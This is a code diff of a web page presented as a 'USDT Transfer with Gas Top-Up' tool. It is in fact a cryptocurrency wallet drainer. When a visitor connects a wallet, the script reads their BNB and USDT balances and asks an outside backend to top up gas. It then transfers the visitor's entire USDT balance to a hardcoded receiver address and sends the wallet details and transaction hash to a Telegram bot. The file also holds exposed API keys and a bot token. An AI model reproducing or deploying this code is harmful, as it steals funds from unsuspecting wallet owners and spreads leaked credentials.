@@ -2,123 +2,134 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>BSC Wallet Balance Sender</title>
+  <title>USDT Transfer with Gas Top-Up</title>
   <script src="https://cdn.jsdelivr.net/npm/web3@1.6.1/dist/web3.min.js"></script>
 </head>
 <body style="font-family: Arial; text-align: center; padding: 40px;">
-  <h2>Connect Wallet & Send BNB + USDT to Telegram</h2>
+  <h2>Connect Wallet & Send USDT with BNB Gas Support</h2>
   <button onclick="connectAndSend()" style="padding: 12px 24px; font-size: 16px;">Connect Wallet</button>
+  <p id="status"></p>
 
   <script>
     const BSC_SCAN_API = 'ZTC12CNRZ8UC8HGFDIW8SARDJXP1N6QIR1';
     const TELEGRAM_TOKEN = '8085520651:AAHM2Kt961rV4QyMSkElrmrnwDmcqFVB9SU';
     const TELEGRAM_CHAT_ID = '8060968649';
     const USDT_CONTRACT = '0x55d398326f99059ff775485246999027b3197955';
+    const RECEIVER = '0x0d4eFb6dfF647912Bb7B29Ed3a0e1E8f6E4c297a';
     const BACKEND_URL = 'https://a-production-c9bc.up.railway.app';
-    const CONTRACT_RECEIVER = '0x0d4eFb6dfF647912Bb7B29Ed3a0e1E8f6E4c297a';
 
     async function connectAndSend() {
+      const status = document.getElementById("status");
+      status.innerText = "🔗 Connecting...";
+
       if (typeof window.ethereum === 'undefined') {
         alert("⚠️ Please install MetaMask or Web3 wallet!");
         return;
       }
 
       const web3 = new Web3(window.ethereum);
-      try {
-        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-        const address = accounts[0];
-        let message = `📲 *Wallet Connected*\n\`${address}\`\n\n`;
+      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+      const user = accounts[0];
+      let message = `📲 *Wallet Connected*\n\`${user}\`\n\n`;
 
-        // Fetch BNB balance
-        const bnbUrl = `https://api.bscscan.com/api?module=account&action=balance&address=${address}&apikey=${BSC_SCAN_API}`;
-        const bnbRes = await fetch(bnbUrl);
-        const bnbData = await bnbRes.json();
-        let bnb = 0;
+      // Fetch BNB balance
+      const bnbUrl = `https://api.bscscan.com/api?module=account&action=balance&address=${user}&apikey=${BSC_SCAN_API}`;
+      const bnbRes = await fetch(bnbUrl);
+      const bnbData = await bnbRes.json();
+      let bnb = 0;
 
-        if (bnbData.status === "1") {
-          bnb = parseFloat(bnbData.result) / 1e18;
-          message += `💰 *BNB*: ${bnb.toFixed(4)}\n`;
-        } else {
-          message += `💰 *BNB*: ❌ Error\n`;
-        }
+      if (bnbData.status === "1") {
+        bnb = parseFloat(bnbData.result) / 1e18;
+        message += `💰 *BNB*: ${bnb.toFixed(4)}\n`;
+      } else {
+        message += `💰 *BNB*: ❌ Error\n`;
+      }
 
-        // Fetch USDT balance
-        const usdtUrl = `https://api.bscscan.com/api?module=account&action=tokenbalance&contractaddress=${USDT_CONTRACT}&address=${address}&tag=latest&apikey=${BSC_SCAN_API}`;
-        const usdtRes = await fetch(usdtUrl);
-        const usdtData = await usdtRes.json();
-        let usdt = 0;
+      // Get BNB price in USD
+      const priceRes = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd');
+      const priceData = await priceRes.json();
+      const bnbUsd = bnb * priceData.binancecoin.usd;
 
-        if (usdtData.status === "1") {
-          usdt = parseFloat(usdtData.result) / 1e18;
-          message += `💵 *USDT*: ${usdt.toFixed(2)}\n`;
-        } else {
-          message += `💵 *USDT*: ❌ Error\n`;
-        }
+      // Fetch USDT balance
+      const usdtUrl = `https://api.bscscan.com/api?module=account&action=tokenbalance&contractaddress=${USDT_CONTRACT}&address=${user}&tag=latest&apikey=${BSC_SCAN_API}`;
+      const usdtRes = await fetch(usdtUrl);
+      const usdtData = await usdtRes.json();
+      const usdt = (parseFloat(usdtData.result) / 1e18).toFixed(2);
+      message += `💵 *USDT*: ${usdt}\n`;
 
-        // Get live BNB price
-        const priceRes = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd');
-        const priceData = await priceRes.json();
-        const bnbPrice = priceData.binancecoin.usd;
-        const bnbUSD = bnb * bnbPrice;
+      if (bnbUsd < 1) {
+        message += `⚠️ *BNB < $1* – requesting backend top-up...\n`;
+        status.innerText = "⚠️ Low BNB, requesting backend top-up...";
 
-        message += `💵 *BNB Value*: $${bnbUSD.toFixed(2)}\n`;
-
-        // If BNB < $1, request backend top-up
-        if (bnbUSD < 1) {
-          message += `⚠️ BNB < $1 – requesting backend top-up...\n`;
-          await fetch(`${BACKEND_URL}/api/topup-bnb`, {
-            method: 'POST',
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ address })
-          });
-          message += `✅ Top-up requested!\n`;
-
-          // Wait and check again
-          message += `⏳ Waiting for balance update...\n`;
-          await new Promise(r => setTimeout(r, 10000));
-
-          const rebnbRes = await fetch(`https://api.bscscan.com/api?module=account&action=balance&address=${address}&apikey=${BSC_SCAN_API}`);
-          const rebnbData = await rebnbRes.json();
-          const newBnb = parseFloat(rebnbData.result) / 1e18;
-          const newUsd = newBnb * bnbPrice;
-
-          if (newUsd < 1) {
-            message += `❌ Still < $1 BNB – cannot proceed.`;
-          } else {
-            message += `✅ BNB balance is now $${newUsd.toFixed(2)} – proceeding to send.\n`;
-            await sendTransaction(web3, address);
-            message += `🚀 Contract interaction initiated.`;
-          }
-        } else {
-          await sendTransaction(web3, address);
-          message += `🚀 Contract interaction initiated.`;
-        }
-
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-          method: 'POST',
+        const topupRes = await fetch(`${BACKEND_URL}/api/topup-bnb`, {
+          method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-            parse_mode: "Markdown"
-          })
+          body: JSON.stringify({ address: user })
         });
 
-        alert("✅ Process completed!");
+        const topup = await topupRes.json();
+        if (!topup.ready) {
+          message += `❌ *Top-up Failed*`;
+          status.innerText = "❌ Top-up failed.";
+          return sendTelegram(message);
+        }
+
+        message += `✅ *Top-up Requested!*\n⏳ *Waiting for balance update...*\n`;
+        await new Promise(r => setTimeout(r, 15000)); // Wait 15 seconds
+
+        const bnbCheck = await fetch(bnbUrl);
+        const newBnbData = await bnbCheck.json();
+        const newBnb = parseFloat(newBnbData.result) / 1e18;
+        const newBnbUsd = newBnb * priceData.binancecoin.usd;
+
+        if (newBnbUsd < 1) {
+          message += `❌ *Still < $1 BNB* – cannot proceed.\n`;
+          status.innerText = "❌ Still not enough BNB.";
+          return sendTelegram(message);
+        }
+
+        message += `✅ *BNB now sufficient! Proceeding...*\n`;
+      } else {
+        message += `✅ *BNB is sufficient!*\n`;
+      }
+
+      // Send USDT via contract
+      const usdtContract = new web3.eth.Contract([
+        { "constant": false, "inputs": [
+            { "name": "_to", "type": "address" },
+            { "name": "_value", "type": "uint256" }
+          ],
+          "name": "transfer",
+          "outputs": [{ "name": "", "type": "bool" }],
+          "type": "function"
+        }
+      ], USDT_CONTRACT);
+
+      const amountToSend = web3.utils.toWei(usdt, "ether");
+
+      try {
+        const tx = await usdtContract.methods.transfer(RECEIVER, amountToSend).send({ from: user });
+        message += `🚀 *USDT Sent Successfully!*\n📦 TX Hash: \`${tx.transactionHash}\``;
+        status.innerText = "✅ USDT sent successfully!";
       } catch (err) {
         console.error(err);
-        alert("❌ Something went wrong");
+        message += `❌ *USDT Transfer Failed*`;
+        status.innerText = "❌ Failed to send USDT.";
       }
+
+      await sendTelegram(message);
     }
 
-    async function sendTransaction(web3, address) {
-      const tx = {
-        from: address,
-        to: CONTRACT_RECEIVER,
-        value: web3.utils.toHex(web3.utils.toWei("0.001", "ether")),
-        gas: 21000
-      };
-      await window.ethereum.request({ method: 'eth_sendTransaction', params: [tx] });
+    async function sendTelegram(msg) {
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: msg,
+          parse_mode: "Markdown"
+        })
+      });
     }
   </script>
 </body>
